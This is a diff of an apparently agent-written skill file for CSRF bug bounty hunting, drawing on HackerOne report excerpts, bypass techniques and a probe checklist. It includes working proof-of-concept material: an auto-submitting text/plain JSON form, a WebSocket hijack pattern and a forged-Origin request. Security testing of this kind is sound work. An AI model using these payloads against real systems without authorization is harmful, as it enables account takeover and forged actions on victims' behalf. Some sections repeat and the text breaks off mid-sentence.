@@ -4,15 +4,15 @@ description: "Use for tokenless or weakly validated state-changing requests, cro
 agent_created: true
 ---
 
-# Cross-Site Request Forgery — unified methodology
+# Cross-Site Request Forgery — unified skill
 
-> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.
+> **Complete merged skill.** Everything from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.
 
-## Corpus evidence (541 valid reports, 93 paid / 17%)
+## Corpus evidence — 541 valid HackerOne reports (93 paid / 17%)
 
-Payment is not validity — zero-bounty disclosures are mined as evidence too.
+Every disclosed report is valid; payment is an impact signal, not a validity test.
 
-### Techniques ranked across ALL valid writeups
+### Techniques ranked across ALL valid reports
 
 | Technique | Reports |
 |---|---:|
@@ -26,18 +26,121 @@ Payment is not validity — zero-bounty disclosures are mined as evidence too.
 | DOM / HTML source inspection | 46 |
 | admin / privileged-role context | 44 |
 | file upload / filename / extension | 41 |
+| cache / CDN / unkeyed header | 36 |
+| webhook / OAuth / SAML / integration abuse | 32 |
+| public source-code / repo review | 22 |
+| subdomain / DNS / cert-transparency recon | 22 |
+|  HosT/absolute-URL reset poisoning | 20 |
+| redirect chain / Location header | 17 |
+| internal service / port / container | 16 |
+| unauthenticated / removed-cookie test | 14 |
+| OAST / DNS / HTTP callback proof | 12 |
+| second-order / stored / blind delivery | 12 |
+| JWT / token / base64 decode | 11 |
+| parameter pollution / duplicate keys | 8 |
+| swap object ID / parameter value | 7 |
+| employee / developer public info | 7 |
+| fuzzing / wordlist brute force | 7 |
+| third-party data / paste / breach reuse | 6 |
+| cloud metadata / IAM abuse | 5 |
+| WAF / sanitizer / filter bypass | 5 |
+| browser DevTools / network tab | 4 |
+| replay / modify a captured request | 4 |
+| error message / stack trace probing | 4 |
+| verbose debug / framework fingerprint | 3 |
+| parser confusion / normalization | 3 |
+| race / concurrency / timing | 3 |
+| JS bundle / source-map inspection | 2 |
+| API docs / Swagger / introspection | 2 |
+| mass assignment / extra request fields | 2 |
+| template injection (SSTI) | 2 |
+| response diff / status / length comparison | 1 |
+| public bucket / storage exposure | 1 |
+| git history / exposed .git | 1 |
+| search-engine dorking | 1 |
 
-### Parameters observed
+### Parameters observed in writeups
 
-`type`, `name`, `value`, `action`, `class`, `method`, `domain`, `src`, `charset`, `max-age`, `utmcsr`, `utmccn`, `utmcmd`, `__utmz`, `path`
+`type` (299), `name` (282), `value` (277), `action` (64), `class` (58), `method` (54), `domain` (42), `src` (21), `charset` (20), `max-age` (12), `utmcsr` (12), `utmccn` (12), `utmcmd` (12), `__utmz` (10), `path` (10), `href` (9), `samesite` (9), `csrftoken` (8), `token` (8), `email` (8), `placeholder` (7), `utmcct` (7), `param1` (7), `json` (7), `rel` (6), `param2` (6), `__utma` (6), `password` (6), `_ga` (5), `enctype` (5)
 
-### Case studies (real reports, paid and unpaid)
+### Bypass primitives observed
 
-- [1497169](https://hackerone.com/reports/1497169) GitHub — CSRF protection bypass in GitHub Enterprise management console ($10000, high)
-- [2326194](https://hackerone.com/reports/2326194) Internet Bug Bounty — Argo CD CSRF leads to Kubernetes cluster compromise ($4660, high)
-- [450796](https://hackerone.com/reports/450796) PayPal — XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim ($3500, medium)
+`content-type` (132), `bypass` (45), `open redirect` (13), `bypassing` (12), `bypassed` (8), `same-site` (7), `content type` (4), `url encoded` (4), `%00` (2), `bypasses` (2), `double slash` (2), `blind` (2), `http method` (2), `%0d%0a` (1), `bypassable` (1), `bypasss` (1), `transfer-encoding` (1), `chunked` (1), `null value` (1), `normalize` (1), `uppercase` (1), `url-encode` (1), `url-encoded` (1), `null byte` (1), `same site` (1)
 
-Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.
+### Impact language observed
+
+`token` (671), `password` (282), `admin` (147), `account takeover` (43), `payment` (39), `localhost` (22), `credential` (22), `unauthorized` (19), `secret` (16), `sensitive information` (11), `rce` (4), `full access` (3), `api key` (3), `privilege escalation` (3), `exfiltrate` (2), `arbitrary file` (2), `funds` (2), `financial` (1), `ato` (1), `sensitive data` (1)
+
+### Case studies — full excerpts (paid and unpaid)
+
+#### [1497169](https://hackerone.com/reports/1497169) — CSRF protection bypass in GitHub Enterprise management console
+
+GitHub · $10000 · high
+
+A path traversal vulnerability was identified in GitHub Enterprise Server management console that allowed the bypass of CSRF protections. This could potentially lead to privilege escalation. To exploit this vulnerability, an attacker would need to target a user that was actively logged into the management console. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.5 and was fixed in versions 3.1.19, 3.2.11, 3.3.6, 3.4.1. [CVE-2022-23732](
+
+#### [2326194](https://hackerone.com/reports/2326194) — Argo CD CSRF leads to Kubernetes cluster compromise
+
+Internet Bug Bounty · $4660 · high
+
+GHSA: It's been publicly known for years that all of Argo CD API is vulnerable to Cross-Site Request Forgery (CSRF). We assume the team haven't made it a priority because of the lack of evidence to support it's a severe vulnerability. Modern browsers implement the Lax SameSite cookie attribute to prevent CSRF, but it is not foolproof. The samesite attribute is rendered useless if the origin is on the same parent domain as the target. We spin up a sample environment with Argo CD v2.8.2 to test this. An attacker controls contents of ​​marketing.victim.com (via Stored XSS, for example) and wants to target argocd.internal.victim.com. The following proof of concept allows the attacker to create a pod with admin privileges on the Kubernetes cluster via Argo CD. This piece of JavaScript is injected on the ​​marketing.victim.com homepage: Where repoURL points to a repository with the yaml definition like: Then wait. An employee logged-in to argocd.internal.victim.com, when visiting marketing.victim.com, will lead to Kubernetes cluster compromise. This is made possible because: - Argo CD does not respect the Content-Type header. If it did, the request would have triggered a preflight CORS request on "application/json" CT and the attack fails. - The attacker needs zero knowledge to craft a valid json. The cluster location, project name… are available by default. ## Impact Kubernetes clus
+
+#### [450796](https://hackerone.com/reports/450796) — XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim
+
+PayPal · $3500 · medium
+
+Due to a cross-origin configuration, the application at refer.xoom.com could be embedded in script tags on other websites. If a malicious site were open in the same browser as refer.xoom.com, the malicious site could see and extract data from the referral page. This included the email addresses being used and, in extreme cases, tokens allowing Xoom access to post on a user’s Twitter. Any Twitter activity was limited, clearly marked as posted by Xoom, and could be mitigated by the user at any time by deauthorizing access. This did not affect any session or financial data and was limited to the referral page.
+
+#### [1122408](https://hackerone.com/reports/1122408) — CSRF on /api/graphql allows executing mutations through GET requests
+
+GitLab · $3370 · high
+
+Mutations are `edit` or `create` queries used in Graphql. Gitlab prevents CSRF in this functionality by sending a POST request with a X-CSRF-Token header. The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header. Using this, an attacker could leverage this to bypass the existing CSRF protection ### Code for Testing This exploit would create a snippet named `Tesssst Snippet` on the user's account. ### Steps to Reproduce 1. Host this file 2. Login to gitlab 3. Open the link to that html 4. Check the snippets for the logged in user. ### Impact The attacker could control bypass the existing CSRF check on the graphql endpoint. ### POC Attached the request and response screenshot ### What is the expected *correct* behavior? The backend must check the existence of csrf tokens for GET requests as well. ## Impact The attacker could control bypass the existing CSRF check on the graphql endpoint.
+
+#### [805073](https://hackerone.com/reports/805073) — Periscope iOS app CSRF in follow action due to deeplink
+
+X / xAI · $2940 · low
+
+Summary This issue is mainly in the Periscope iOS app against CSRF follow action using deeplink. as the report #583987 the CSRF work on iOS app POC 1 QR code to follow periscope profile `pscp://user/periscopeco/follow ` ███████ POC2 by kunal94 video █████████ ## Impact CSRF Follow against any user in periscope iOS app
+
+#### [1010522](https://hackerone.com/reports/1010522) — [CSRF] TikTok Careers Portal Account Takeover
+
+TikTok · no bounty — still valid · high
+
+A missing CSRF protection and open redirect vulnerability was reported in the TikTok Careers portal single sign on flow which is used by applicants to apply for TikTok positions. This flaw was quickly remediated and does not impact TikTok.com or mobile application. We thank @lauritz for reporting this vulnerability to our team and for confirming the resolution. I wrote a short [blog post]( that covers this report. If you have any feedback, feel free to ping me at [Twitter]( 🙂
+
+#### [807924](https://hackerone.com/reports/807924) — CSRF on connecting Paypal as Payment Provider
+
+Shopify · no bounty — still valid · medium
+
+Hi, I think there is a weak csrf protection on adding paypal as the payment provider, but the protection is not good. When user try to add paypal as payment provider, they will make this GET request ` The `merchantId` belongs to your store only, and the base64 decoded value is `1583030504:010f06db85734b485ed095c45af1cfe7` which is obviously too long to brute force, I'll say it is a pretty good way to mitigate CSRF, however there is one catch. This value is fixed, i.e. if someone who previously was an admin of this store before, then he/she can take advantage of this fixed value for CSRF protection, and perfomr CSRF attack on victim to connect victim's payment provider to their Paypal order. Or this value is leaked somewhere, then the store owner is forever vulnerable to CSRF attack ## Steps to reproduce - Visit if there is already paypal account connected, disconnect it first - Then click the link Acitivate paypal express checkout - In the link, jot down the value of merchantId, this merchantId belongs to your store only, in order to connect your store to victim's store, you'll need this parameter, it looks like this `MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D` - Finally, visit this link with merchantId replaced with the value you got from above step (replace YOUTSUBDOMAIN and REPLACEME) ` Here in `5NS8DHQCFGT84` is the attacker's paypal merchant id, so af
+
+### Recurring approach patterns from real reports
+
+- 5× with a little help of social engineering like sending a link via email chat an attacker may trick the users of a web application into executing actions of the attacker s choosing
+- 2× korprit was able to demonstrate this vulnerability by crafting a specially formatted webpage
+- 2× description during my search in this domain i found it vulnerable to csrf so i tried to escalate it account takeover and i succeed impact account takeover via csrf system host s affected product s and version s cve numbers steps to reproduce vulnerable domain and endpoint
+- 1× hi i have found a flash content type sniff vulnerability could allow attackers get user s team auth2 tokens
+- 1× link while approving and reviewing a phrase you are able to send set a message
+- 1× an attacker would need to guess the order id by sending some a lot of requests
+- 1× i am security researcher and i pen test your website and i found there is click jacking attack and csrf attack can be done
+- 1× to achieve the same session token is not verified while changing account setting s which result in account takeover description i have found that while changing setting session token is not verified so an attacker can basically plot a csrf attack which would change the default email of the user and this would led to account takeover
+- 1× hey there i found out that an attacker can use the password reset link to forge requests because there is no csrf token in that particular request to validate that request
+- 1× hello i m not sure it s intentional or somehow you missed it i noticed that when user follow people on vimeo csrf token of the request doesn t change at all
+- 1× brief i have discovered a way to issue api calls on behalf of other users
+- 1× i have only created a proof of concept for safari tested on newest version on osx but there is a big chance that this is possible from other browsers and other plugins too
+- 1× during research of vimeo com i found that you are using anti csrf token against csrf attack
+- 1× hi i have noticed that when the account verification fails here due to an error the csrf token is being leaked via get method like so the authenticity token is being stored in the web browser history and can be retrieved by a malicious attacker in order to mount a successful csrf attack against the victim
+- 1× while testing website i have found interesting issue
+- 1× hello i found a info disclosure vulnerability
+- 1× and i found that id is id is id is id is i attached photos from burp repeater to be more explicit
+- 1× here was my initial email hello i ve been playing with getting rails apps to send csrf tokens to the wrong domains and i found a few problems
+- 1× vulnerability description the application unifi v3 uses json requests to add edit save delete configuration options on the administrative web interface but the application has an insufficient cross site request forgery protection in place by only checking whether the referer header is present and if its actual value matches the host where the system is running default
+- 1× this could be done using vimeo api i used the access token of ios vimeo app an attacker could remotely add and delete the videos in watchlater list of any user with out any permission of user
+- 1× hey guys i just found an csrf token fixation in facebook store app which is an offical shopify app link the csrf bug which connects attacker s facebook account to victim s shopify account
+- 1× now if we open the products page we can see the product status changed
+- 1× to prevent this the application should first check to see if the url specified is a valid image extension before sending the actual get request to the remote site
+- 1× hi i m found bug csrf it is possible to add album by attacker on onpatient com steps to verify
 
 ## Corpus-backed method (this class)
 
@@ -67,11 +170,17 @@ Full payload bank, bypass frequencies, approach patterns and case-study excerpts
 - CSRF account linking -> third-party identity takeover.
 - CSRF admin action -> privilege or configuration change.
 
+### Probes
+
+- Auto-submitting cross-origin form to the state-changing endpoint
+- Send the same request as JSON, form, multipart, and with method override
+- Drop Origin/Referer; try null origin and subdomain origin
+
 ### Veteran tip
 
 Only a minority of valid CSRF reports paid — but the technique is real; always price the *action*, not the presence of a token.
 
-## Unified upstream methodology (deduplicated)
+## Unified upstream methodology (complete, deduplicated)
 
 ### Discovery and hunting method
 
@@ -116,6 +225,10 @@ Start here. These are the highest-yield tests for this class.
 - Send an empty value (`_token=`) — some validate format, not presence
 - Copy a token from another session — some tokens aren't tied to the session
 
+**Scope:** Don't test CSRF on login forms (no existing session to exploit), logout (no real impact), or read-only GET endpoints.
+
+---
+
 ### Step-by-Step Hunting Methodology
 
 1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.
@@ -142,7 +255,9 @@ Start here. These are the highest-yield tests for this class.
 
 9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.
 
-10. **Build PoC HTML page*
+10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.
+
+---
 
 ### Web-Research Methodology Additions (2026)
 
@@ -156,7 +271,18 @@ Research basis: PortSwigger Web Security Academy "Bypassing SameSite cookie rest
 - **Cookie shape:** `__Host-` prefix vs a bare `Domain=` cookie; `SameSite=Strict|Lax|None`, `Secure`. A domain-scoped session cookie shared with sibling subdomains is the classic site-based bypass.
 - **Double-submit implementation:** is the token merely duplicated in a cookie (naive, forgeable via a sibling subdomain or plaintext-HTTP cookie injection) or HMAC-bound to the session (signed)?
 - **Client-side CSRF gadgets:** JS that builds `fetch()` from `location.hash` / `location.search` (e.g. `#post;/api/profile`), DOM-based open redirects used as on-site gadgets, `postMessage`-driven requests.
-- **Sites vs origins:** enumerate every sibling subdomain of the registrable domain — a cross-origin, same-site XSS/subdomain-takeover de
+- **Sites vs origins:** enumerate every sibling subdomain of the registrable domain — a cross-origin, same-site XSS/subdomain-takeover defeats SameSite entirely.
+- **Framework built-ins:** .NET antiforgery, Go 1.25+ `CrossOriginProtection` (Fetch-Metadata based), framework-wide middleware that may be disabled on `/api/*`.
+- **Also:** WebSocket handshake endpoints (CSWSH), GET-based state changes, login CSRF, GraphQL mutations via GET.
+
+- **Protected-action inventory:** spider the authenticated session and list every POST/PUT/PATCH/DELETE with its Content-Type and whether a token/header is required. Missing coverage on one endpoint is the finding.
+- **Fetch-Metadata server behavior:** does the app check `Sec-Fetch-Site` at all? Log the header value and resulting decision for same-origin, same-site, cross-site, and absent cases.
+- **Cookie domain audit:** compare `Set-Cookie` across login, logout, and BFF endpoints; a `Domain=.example.com` cookie with a dangling sibling CNAME is a concrete chain.
+- **Token lifecycle:** capture the same token across two page loads, two sessions of one user, and two different users. Static-per-session or cross-user reuse are exploitable.
+- **CORS config:** `Access-Control-Allow-Origin` with credentials plus a permissive subdomain regex enables the custom-header bypass from a taken-over sibling.
+- **Login/session-fixation surface:** forced-login CSRF and pre-set session IDs via `?next=`/`redirect` parameters.
+- **Form-action / polyglot surface:** `<form enctype="text/plain">` producing valid JSON, and base64/multipart wrappers used to smuggle a body past a naive content-type check.
+- **GraphQL mutation-via-GET:** test `?query=mutation{...}` — a backend that skips token checks for GET is exploitable via `<img src>`.
 
 ### Signals and surfaces
 
@@ -222,7 +348,11 @@ Access-Control-Allow-Credentials: true      # dangerous combo
 
 ---
 
-_...and 1 more sections in `references/unified-method.md`._
+### Attack class 2 — SignalR/WebSocket carve-out (the `/negotiate` shortcut)
+
+Browser WebSockets cannot send custom headers, so `X-CSRF: 1` cannot be enforced on the upgrade. Developers routinely work around this by **excluding SignalR hub paths from BFF antiforgery** (`MapHub<X>().DisableAntiforgery()` or registering them as non-BFF endpoints). Once excluded, any same-site origin (including a takenover sibling subdomain or a stored-XSS page) can open the WS with the ambient session cookie → CSRF-over-WebSocket to invoke hub methods that mutate state.
+
+**Payload shape:** cross-origin page opens `new WebSocket("wss://bff.example.com/hubs/admin")` — browser sends session cookie, no `X-CSRF` required, attacker invokes `DeleteUser(id)` via standard SignalR JSON frame. ([DuendeArchive/Support#972](https://github.com/DuendeArchive/Support/issues/972), [learn.microsoft.com/aspnet/core/signalr/security](https://learn.microsoft.com/en-us/aspnet/core/signalr/security))
 
 ### Techniques, payloads and bypasses
 
@@ -256,7 +386,54 @@ One concrete lesson per report (mined from the writeup), newest and most-upvoted
   > Then it redirects us to the callback endpoint which sends a postmessage to the embedded iframe to validate the integration on the client side.
 - **CSRF protection bypass in GitHub Enterprise management console** — `#1497169` · GitHub · $10,000 · ▲152
   > [CVE-2022-23732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23732)
-- **Slack integration setup lacks
+- **Slack integration setup lacks CSRF protection** — `#170552` · HackerOne · $2,500 · ▲149
+  > Cross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR TEAM]/integrations) feature for teams.
+- **CSRF token validation system is disabled on Stripe Dashboard** — `#1483327` · Stripe · $0 · ▲113
+  > @d sharad discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
+- **Referer Leakage Vulnerability in  socialclub.rockstargames.com/crew/ leads to FB'S OAuth token theft.** — `#787160` · Rockstar Games · $0 · ▲112
+  > The Open Redirect is the subject of a separate report; in this report, we addressed the problem by strengthening the Referer header policy with `<meta name="referrer" content="origin" / `.
+- **Cross-Site Request Forgery** — `#2041007` · ownCloud · $0 · ▲111
+  > I think the cause of this vulnerability is the second condition of https://github.com/owncloud/core/blob/master/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php L145, because the the value of `$this- request- getHeader("Authorization")` is…
+- **Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers** — `#419891` · Khan Academy · $0 · ▲111
+  > The `/signup/email` API endpoint at [khanacademy.org](https://khanacademy.org) is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.
+- **CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/** — `#474833` · Rockstar Games · $0 · ▲104
+  > In this report, the researcher identified a Cross-Site Request Forgery vulnerability that could have allowed attackers to link a Facebook account to another user's Social Club account, and thus gain the ability to log in as the victim.
+- **Account takeover due to insufficient URL validation on RelayState parameter** — `#1923672` · GitLab · $2,450 · ▲99
+  > https://bitbucket.org/site/oauth2/authorize?client id=b9jLmh8WCLZPBAwWba&redirect uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response type=token&state=DoesNotMatter
+- **One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com** — `#1046630` · Logitech · $0 · ▲99
+  > Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC
+- **CSRF Account Takeover** — `#1253462` · TikTok · $0 · ▲95
+  > A Cross-Site Request Forgery (CSRF) vulnerability was found on a TikTok endpoint which could have resulted in a full account takeover.
+- **CSRF to HTML Injection in Comments** — `#428019` · WordPress · $0 · ▲95
+  > More [details are available on the RIPS blog](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/).
+- **CSRF in Account Deletion feature (https://www.flickr.com/account/delete)** — `#615448` · Flickr · $0 · ▲92
+  > While testing the account deletion feature, I noticed that there were no CSRF token :/ Later found out it was because of the new login flow.
+- **Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account** — `#423022` · Discourse · $0 · ▲89
+  > There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.
+- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88
+  > Mutations are `edit` or `create` queries used in Graphql.
+- **CSRF token validation system is disabled on Stripe Dashboard** — `#1493437` · Stripe · $2,500 · ▲87
+  > @rodolfomarianocy discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.
+- **CSRF leads to Account takeover** — `#2699029` · U.S. Dept Of Defense · $0 · ▲87
+  > Vulnerable domain and endpoint : https://██████████/account/profile/edit
+- **Login CSRF vulnerability on hackerone.com** — `#834366` · HackerOne · $500 · ▲84
+  > We found a CSRF token bypass on the Hacker One login page.
+- **Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)** — `#709537` · Acronis · $0 · ▲82
+  > - navigate to `https://academy.acronis.com/ /account/edit/account id/<your id `
+- **XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim** — `#450796` · PayPal · $3,500 · ▲81
+  > This included the email addresses being used and, in extreme cases, tokens allowing Xoom access to post on a user’s Twitter.
+- **CSRF in ticket function** — `#1890310` · TikTok · $0 · ▲80
+  > I found this issue by removing the CsrfToken from the header and converting the content type from `JSON` to `x-www-form-urlencoded`.
+- **Account takeover by changing email** — `#538800` · Khan Academy · $0 · ▲80
+  > Attacker then lures a new KA user to visit a URL linking to a page that sends a `POST` request to `/signup/email` with the POST body : `casing=camel&email=ATTACKER EMAIL`.
+- **CSRF protection bypass on TikTok Webcast Endpoints** — `#1543234` · TikTok · $2,500 · ▲79
+  > API on TikTok Webcast endpoints prevent CSRF by validating the Origin header which indicates the source of the request.
+- **CSRF protection on OIDC login is broken** — `#1878381` · Nextcloud · $500 · ▲77
+  > So I assume the bug is also the same https://github.com/nextcloud/user oidc/blob/main/lib/Controller/Id4meController.php L175-L181
+- **Japan - CSRF in webapp.starbucks.co.jp with user interaction could leak an access token if the user was not using Chrome** — `#1113559` · Starbucks · $0 · ▲77
+  > elber discovered a CSRF in webapp.starbucks.co.jp leaked an access token if an authenticated user opened a crafted HTML file in a browser other than Chrome which has Same Site Attribute for the cookie set by default.
+- **CSRF on Periscope Web OAuth authorization endpoint** — `#215381` · X / xAI · $0 · ▲74
+  > At minimum, I found endpoints that allow creating a broadcast (https://public-api.periscope.tv/v1/broadcast/create), tweeting it (https://public-api.periscope.tv/v1/broadcast/publish) and deleting a broadcast…
 
 ### Payload fragments observed
 
@@ -281,7 +458,9 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 | 1× | `https://academy.acronis.com/#/account/edit/account_id/<your_id>` |
 | 1× | `<img>` |
 | 1× | `__utmz=123456.123456789.11.2.utmcsr=[HOST]\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=[PATH]` |
-| 1× | `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru\\|utmccn=(referr
+| 1× | `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=/path/` |
+| 1× | `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` |
+| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |
 
 ### Common Root Causes
 
@@ -311,9 +490,23 @@ Recurring payloads from this class's writeups. Adapt, don't paste blindly.
 - **Null-origin bypass:** serve the PoC from a sandboxed iframe (`<iframe sandbox>` without `allow-same-origin`) so `e.origin` is `null`; if the app allowlists `null` (or compares against `window.origin`, which sandboxing also makes `null`), the check passes. PortSwigger also notes `Origin`-omission cases.
 - **Naive double-submit forge:** from a controlled sibling or via plaintext HTTP cookie injection, plant a matching cookie; the server compares cookie==parameter and accepts. Only the signed, session-bound HMAC pattern resists this.
 - **Referer string checks:** permissive prefix/format validation is bypassable the same way as weak postMessage/CORS checks (e.g. a look-alike host).
-- **Client-side CSRF:** manipulate the hash fragment that the JS feeds to 
+- **Client-side CSRF:** manipulate the hash fragment that the JS feeds to `fetch()` — the token and cookies are added by the trusted script itself, so synchronizer tokens and SameSite don't help: `https://site/index/#post;/api/account/profile`.
+- **Fetch-Metadata policy gaps:** a policy that only rejects unsafe methods on `cross-site` may still allow cross-site GET to a sensitive endpoint; treating `same-site` as trusted is unsafe if a sibling is compromised; absent `Sec-Fetch-*` must fail closed, not open.
+- **WebSocket CSWSH:** an attacker page opens `new WebSocket('wss://target/...')` — the browser sends the ambient cookie and no custom CSRF header can be required on the upgrade.
 
-_...and 1 more sections in `references/unified-method.md`._
+### JSON CSRF via text/plain (bypasses Content-Type check)
+
+```html
+<html>
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="https://target.com/api/heartbeat"
+        enctype="text/plain">
+    <!-- browser sends: {"status":"ok","x":"=padding"} -->
+    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
+  </form>
+</body>
+</html>
+```
 
 ### Validation and proof
 
@@ -354,7 +547,14 @@ _...and 1 more sections in `references/unified-method.md`._
 
 - **Method/Content-Type matrix:** repeat with form, `text/plain` JSON, and a custom header. A single accepted variant is the finding; document exactly which.
 - **Origin variations:** no header, trusted value, look-alike value, and `null` — record which the server accepts.
-- **Cookie attachment:** in the victim browser, confirm the session cookie is present on the cross-origin reques
+- **Cookie attachment:** in the victim browser, confirm the session cookie is present on the cross-origin request (Network tab); if SameSite withheld it, the PoC fails.
+- **State proof:** compare the victim account before/after — email, role, linked accounts, balance — not just a 200 response.
+- **No-XSS condition:** ensure the chain does not depend on XSS on the target origin; if it does, report the XSS as primary.
+- **Duplicate-report guard:** if the only issue is a missing token on a logout or read-only GET, kill the finding per the Gate 0 rules already in this skill.
+- **Same-site gadget proof:** for a Strict-cookie bypass, show the client-side redirect producing a same-site request with cookies, and that a server-side 302 does NOT.
+- **CSWSH proof:** show a cross-origin WebSocket opening with 101 and a hub/method call mutating state.
+- **BFF-specific:** for Duende-style BFFs, replay an admin-partition call with `X-CSRF: 1` from a low-priv session and dump `/bff/user` claims.
+- **Fetch-Metadata absence:** show a request with no `Sec-Fetch-*` headers (e.g. via an intercepting proxy that strips them) still succeeding.
 
 ### Escalation and related chains
 
@@ -435,19 +635,1233 @@ curl -sI https://target.com/login | grep -i "set-cookie"
 grep -r "RelayState" --include="*.js" .
 ```
 
+### Sources and related reading
+
+### Query the corpus
+
+```sh
+python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class csrf --limit 20
+python3 ~/.local/share/hackerone-reports/h1.py stats --class csrf
+python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
+```
+
+Search by technology, endpoint, parameter, or program. Examples:
+
+```sh
+python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class csrf
+python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class csrf --min-bounty 1000
+```
+
+### Related
+
+- `hackerone-xss` (2,569 reports)
+- `hackerone-oauth-oidc` (177 reports)
+- `hackerone-clickjacking` (166 reports)
+
+### Related
+
+- `xss` (2,569 reports)
+- `oauth-oidc` (177 reports)
+- `clickjacking` (166 reports)
+
+### D. Sources — numbered list of URLs you actually fetched
+
+1. https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
+2. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+
+### Additional notes
+
+### Parameters observed
+
+`email` · `code` · `state` · `id` · `page` · `redirect_uri` · `authenticity_token` · `client_id` · `scope` · `nonce` · `sort_type` · `sort_direction` · `limit` · `password` · `act` · `subject` · `report_id` · `view` · `text_query` · `response_type`
+
+### [CSRF] TikTok Careers Portal Account Takeover
+
+`#1010522` · TikTok · $0 · high · 2020-12-15 · ▲366
+> A missing CSRF protection and open redirect vulnerability was reported in the TikTok Careers portal single sign on flow which is used by applicants to apply for TikTok positions. This flaw was quickly remediated and does not impact TikTok.com or mobile application. We thank @lauritz for reporting this vulnerability to our team and for confirming the resolution. I wrote a short blog post that covers this report.
+
+### CSRF on connecting Paypal as Payment Provider
+
+`#807924` · Shopify · $0 · medium · 2020-04-10 · ▲304
+> Hi, I think there is a weak csrf protection on adding paypal as the payment provider, but the protection is not good. When user try to add paypal as payment provider, they will make this GET request https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…
+
+### Account Takeover using Linked Accounts due to lack of CSRF protection
+
+`#463330` · Rockstar Games · $0 · high · 2019-02-20 · ▲238
+> In this report, the researcher found a weakness in our third-party account linking process. They were able to create a malicious link that, if clicked by the victim, would under certain conditions give the attacker access to the victim's Social Club account. This issue has now been fixed.
+
+### Periscope android app deeplink leads to CSRF in follow action
+
+`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224
+> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.
+
+### Take over of accounts created using Google or Facebook
+
+`#442901` · Khan Academy · $0 · critical · 2019-05-17 · ▲184
+> When a user creates an account using Google or Facebook and does not set an additional password, it is possible to set their passwords via CSRF. Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken. To reproduce, create an account with Google or Facebook and make account load the attached HTML file.
+
+### Shortcut: a raw HTTP client beats a real cross-origin page for header-check CSRF
+
+A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it will send
+whatever `Origin`/`Referer` header VALUE you set, from any path, on the same connection as your
+authenticated cookie. Many apps that claim to defend against CSRF only do a naive **string check**
+on the incoming `Origin`/`Referer` header (does it contain/equal some expected value?) rather than
+real same-origin enforcement — you can satisfy that check directly by setting the header, with no
+actual cross-site delivery (hosting an HTML page, a headless browser) required. This is faster and
+more reliable than building a real attacker page for this exact pattern:
+```
+POST /profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://a-domain-the-app-treats-as-trusted-or-attacker-controlled.example
+Cookie: <authenticated session>
+
+username=csrf_poc
+```
+If some text names a SPECIFIC origin/domain as the "expected" attacker page, that literal value is
+often exactly what the server's check is looking for — try it verbatim in `Origin` (fall back to
+`Referer` if `Origin` alone doesn't flip it). Only build a real cross-origin page (actual browser
